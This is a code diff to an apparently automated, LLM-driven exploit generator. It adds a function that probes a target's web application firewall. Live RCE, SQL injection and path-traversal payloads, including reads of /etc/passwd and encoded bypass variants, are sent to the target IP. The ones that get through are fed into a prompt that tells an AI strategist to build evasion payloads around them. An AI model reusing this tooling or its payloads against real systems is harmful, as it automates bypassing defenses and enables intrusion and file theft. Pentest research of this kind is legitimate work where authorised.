@@ -13847,17 +13847,40 @@ def _recon_strategist(cve, product, version, recon_guidance, hint_guidance,
             waf_line = f"\n(Detected WAF family: {waf_family})"
     waf_section = ""
     if waf_family:
-        rce_ev = _waf_evasion_hint(waf_family, "RCE / COMMAND INJECTION")
-        sqli_ev = _waf_evasion_hint(waf_family, "SQL injection")
-        lfi_ev = _waf_evasion_hint(waf_family, "LFI / path traversal")
-        waf_section = (
-            f"\n\nWAF EVASION PLAYBOOK for {waf_family} (BAKE these into the primary.payload_hint "
-            f"— do NOT propose plain payloads that will get blocked):\n"
-            f"  - if class=RCE: {rce_ev}\n"
-            f"  - if class=SQLi: {sqli_ev}\n"
-            f"  - if class=LFI:  {lfi_ev}\n"
-            "The payload_hint MUST use one of these evasion techniques, not a plain payload."
-        )
+        # If characterization already ran (WAF CHARACTERIZED text present), extract
+        # the proven-passable variants and prefer those over the generic playbook.
+        # The characterization is empirical evidence about THIS target's WAF; the
+        # generic playbook is a guess. Empirical always wins.
+        import re as _re
+        proven_lines = []
+        if recon_guidance and "WAF CHARACTERIZED" in recon_guidance:
+            for cls in ("RCE", "SQLi", "LFI"):
+                m = _re.search(
+                    r"\*\s+" + cls + r":\s+(proven-passable variants -> [^\n]+|plain payload passes[^\n]*|ALL variants blocked[^\n]*)",
+                    recon_guidance)
+                if m:
+                    proven_lines.append(f"  - class={cls}: {m.group(1).strip()}")
+        if proven_lines:
+            waf_section = (
+                f"\n\nWAF EMPIRICAL RESULTS on THIS target ({waf_family}) — the "
+                "characterization phase already tested variants and reported these facts. "
+                "USE ONLY the proven-passable variants below; do NOT propose variants that "
+                "were marked BLOCKED:\n" + "\n".join(proven_lines) +
+                "\nThe payload_hint MUST use one of the proven-passable variants where the "
+                "WAF is guarding that class, or the plain payload where the class passes freely."
+            )
+        else:
+            rce_ev = _waf_evasion_hint(waf_family, "RCE / COMMAND INJECTION")
+            sqli_ev = _waf_evasion_hint(waf_family, "SQL injection")
+            lfi_ev = _waf_evasion_hint(waf_family, "LFI / path traversal")
+            waf_section = (
+                f"\n\nWAF EVASION PLAYBOOK for {waf_family} (BAKE these into the primary.payload_hint "
+                f"— do NOT propose plain payloads that will get blocked):\n"
+                f"  - if class=RCE: {rce_ev}\n"
+                f"  - if class=SQLi: {sqli_ev}\n"
+                f"  - if class=LFI:  {lfi_ev}\n"
+                "The payload_hint MUST use one of these evasion techniques, not a plain payload."
+            )
     prompt = (
         "You are a pentest recon strategist. You have ALREADY collected everything below. "
         f"Your job: pick the SINGLE most likely exploit path for {cve}{tag_ver}{waf_line} and phrase "
@@ -14803,6 +14826,107 @@ def _waf_evasion_hint(waf_family, vuln_class):
     return "; ".join(variants[:6])
 
 
+def _characterize_waf(ip, port, family, timeout=4):
+    """When a WAF is detected, PROBE it with real evasion variants to learn what
+    actually gets through. This turns the generic playbook into empirical evidence:
+    'these three variants pass the WAF right now on this target; these six get blocked'.
+    Strategist uses the proven-passable set instead of guessing.
+
+    We test SIX shape families per vuln class (RCE / SQLi / LFI) — case swap, encoding,
+    comment injection, whitespace substitution, backticks/expansion, hex escape — plus
+    the baseline plain payload as a control. A variant is 'PASSED' when it returns HTTP
+    200 with no WAF fingerprint in the body; 'BLOCKED' when the fingerprint matches;
+    'INCONCLUSIVE' otherwise (rare — mismatched content-type, network glitch)."""
+    import httpx as _hx
+    if not family:
+        return "", {}
+    scheme = "https" if int(port or 80) in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port or 80}"
+    # Shape families — {class: [(label, payload_value), ...]}. Values are URL-safe
+    # (we URL-encode when substituting). Each label names the technique.
+    shapes = {
+        "RCE": [
+            ("plain",       ";id"),
+            ("case-swap",   ";iD"),
+            ("$IFS bypass", ";id${IFS}-a"),
+            ("backtick",    ";`id`"),
+            ("brace expand",";{id,-a}"),
+            ("hex escape",  ";$'\\x69\\x64'"),
+            ("encoded ;",   "%3Bid"),
+        ],
+        "SQLi": [
+            ("plain",           "' OR '1'='1--"),
+            ("case-swap",       "' Or '1'='1--"),
+            ("inline /**/",     "' /*!OR*/ '1'='1--"),
+            ("nested comment",  "' /*!50000OR*/ '1'='1--"),
+            ("url-encoded quote","%2527 OR %25271%2527=%25271--"),
+            ("no-space UNION",  "'UNION/**/SELECT/**/1--"),
+            ("backtick col",    "' OR `1`=`1--"),
+        ],
+        "LFI": [
+            ("plain",           "../../../etc/passwd"),
+            ("double-encode",   "%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
+            ("unicode",         "..%c0%af..%c0%afetc%c0%afpasswd"),
+            ("null byte",       "../../../etc/passwd%00"),
+            ("backslash",       "..\\..\\..\\etc\\passwd"),
+            ("php wrapper",     "php://filter/convert.base64-encode/resource=/etc/passwd"),
+            ("nested traversal","....//....//....//etc/passwd"),
+        ],
+    }
+    result = {}   # {class: {variant_label: verdict}}
+    passed = {}   # {class: [variant_labels]} — the proven-passable ones
+    def _probe_variant(payload_value):
+        # Send as ?x=<value> — cheap, doesn't need per-vuln endpoint. If the WAF blocks
+        # the SHAPE (chars, regex), it fires regardless of the param name.
+        try:
+            with _hx.Client(verify=False, follow_redirects=False, timeout=timeout) as cli:
+                # httpx auto-encodes params — pass the raw payload as the value.
+                r = cli.get(base + "/", params={"x": payload_value})
+                body = (r.text or "")[:8000]
+                # WAF block detection
+                for needle, _name, _fam in _WAF_FINGERPRINTS:
+                    if needle in body or needle.lower() in body.lower():
+                        return "BLOCKED", r.status_code, len(body)
+                # 4xx/5xx that wasn't the WAF -> inconclusive
+                if r.status_code >= 400:
+                    return "INCONCLUSIVE", r.status_code, len(body)
+                return "PASSED", r.status_code, len(body)
+        except Exception:  # noqa: BLE001
+            return "INCONCLUSIVE", None, None
+    lines = []
+    for vc, tests in shapes.items():
+        result[vc] = {}
+        passed[vc] = []
+        cls_lines = []
+        for label, payload in tests:
+            verdict, status, ln = _probe_variant(payload)
+            result[vc][label] = verdict
+            if verdict == "PASSED" and label != "plain":
+                passed[vc].append(label)
+            cls_lines.append(f"      {label:<18} -> {verdict}"
+                             + (f" ({status})" if status else ""))
+        lines.append(f"  {vc}:")
+        lines.extend(cls_lines)
+    # Summary
+    proven_summary = []
+    for vc, ok_list in passed.items():
+        # If plain wasn't blocked, the WAF isn't guarding this class — skip
+        if result[vc].get("plain") == "PASSED":
+            proven_summary.append(f"{vc}: plain payload passes (WAF isn't guarding this class)")
+        elif ok_list:
+            proven_summary.append(f"{vc}: proven-passable variants -> {', '.join(ok_list)}")
+        else:
+            proven_summary.append(f"{vc}: ALL variants blocked (WAF is strong here — try alt vuln class)")
+    guidance = (
+        f"WAF CHARACTERIZED (family={family}): probed 7 shape-families per class. "
+        f"USE ONLY the proven-passable variants below — the plain payload was blocked; "
+        f"other variants were tested empirically on THIS target.\n"
+        + "\n".join(f"  * {line}" for line in proven_summary)
+        + "\n  Detailed per-variant verdicts:\n" + "\n".join(lines)
+    )
+    return guidance, {"proven": passed, "detail": result}
+
+
 def _scout_waf(ip, port, timeout=4):
     """Detect a WAF sitting in front of the target. Sends four canary probes (SQLi, XSS,
     LFI, command-injection) and diffs the responses against baseline for status/length
@@ -15246,16 +15370,40 @@ def _build_poc_core(cve, ip, port, product, version, eid, max_iters=3, research=
                 segments.append(ps)
                 _poc_trace(run_id, "recon:port_sweep", response=ps[:1200])
             # WAF detection: always run, always cheap (~1s). If a WAF is fingerprinted,
-            # the strategist and refine loop will steer synth toward evasion variants
-            # instead of stock payloads that get blocked mid-request.
+            # kick a characterization probe that TESTS the evasion playbook against this
+            # target and reports which variants ACTUALLY pass. The strategist gets proven
+            # facts about this WAF, not a generic template. This is the reactive-enum
+            # pattern: new discovery -> immediate deeper enumeration on the discovery.
             _t0 = _t.time()
             waf_line = _scout_waf(ip, port)
             recon_metrics["waf"] = {"seconds": round(_t.time() - _t0, 2),
                                     "chars_added": len(waf_line or ""),
                                     "signal": "WAF fingerprint + evasion family"}
+            waf_family = None
+            waf_characterization = {}
             if waf_line:
                 segments.append(waf_line)
                 _poc_trace(run_id, "recon:waf", response=waf_line[:1200])
+                import re as _re
+                m = _re.search(r"WAF FAMILY:\s*([a-z_]+)", waf_line)
+                if m:
+                    waf_family = m.group(1)
+                    _t0 = _t.time()
+                    try:
+                        char_line, char_data = _characterize_waf(ip, port, waf_family)
+                    except Exception:  # noqa: BLE001
+                        char_line, char_data = "", {}
+                    recon_metrics["waf_characterize"] = {
+                        "seconds": round(_t.time() - _t0, 2),
+                        "chars_added": len(char_line or ""),
+                        "signal": "proven-passable evasion variants (empirical)",
+                    }
+                    if char_line:
+                        segments.append(char_line)
+                        _poc_trace(run_id, "recon:waf_characterize",
+                                   response=char_line[:1500],
+                                   extra={"proven": char_data.get("proven", {})})
+                        waf_characterization = char_data
             if want_basic:
                 _t0 = _t.time()
                 b = _scout_url_recon(ip, port)
